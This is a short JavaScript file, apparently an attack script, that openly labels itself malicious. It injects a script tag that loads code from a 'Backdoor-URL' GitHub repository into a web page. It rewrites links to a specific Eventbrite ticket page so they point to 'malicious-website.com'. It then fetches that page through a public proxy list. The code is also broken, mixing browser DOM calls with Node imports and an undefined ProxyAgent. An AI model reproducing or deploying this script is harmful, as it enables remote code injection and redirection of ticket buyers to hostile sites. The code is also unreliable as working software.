// Generate a unique script name
const scriptName = 'malicious-script-' + Date.now() + '.js';

// Malicious script URL
const scriptUrl = 'https://github.com/Lm33n0/Backdoor-URL-/blob/main/' + scriptName;

// Function to inject the malicious script
function injectScript() {
  const script = document.createElement('script');
  script.src = scriptUrl;
  script.onload = function() {
    console.log('Script injected successfully');
  };
  script.onerror = function() {
    console.error('Failed to inject script');
  };
  document.documentElement.appendChild(script);
}

// Call the function to inject the script
injectScript();

// Original link and malicious link
const originalLink = 'https://www.eventbrite.com/e/the-bankroll-edition-tickets-898005788487?aff=oddtdtcreator';
const maliciousLink = 'https://malicious-website.com';

// Function to get the original link from the page
function getOriginalLink() {
  const links = document.getElementsByTagName('a');
  for (let i = 0; i < links.length; i++) {
    if (links[i].href.includes(originalLink)) {
      return links[i];
    }
  }
  return null;
}

// Function to replace the original link with the malicious link
function replaceLink() {
  const originalLinkElement = getOriginalLink();
  if (originalLinkElement) {
    originalLinkElement.href = maliciousLink;
  }
}

// Call the function to replace the link
replaceLink();

// Proxy setup
const fetch = require('node-fetch');

// Set the URL of the target website
const url = 'https://www.eventbrite.com/e/the-bankroll-edition-tickets-898005788487?aff=oddtdtcreator';

// Set the proxy URL
const proxyUrl = 'http://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all';

// Make the request through the proxy
fetch(url, {
  agent: new ProxyAgent(proxyUrl)
})
  .then(response => response.text())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));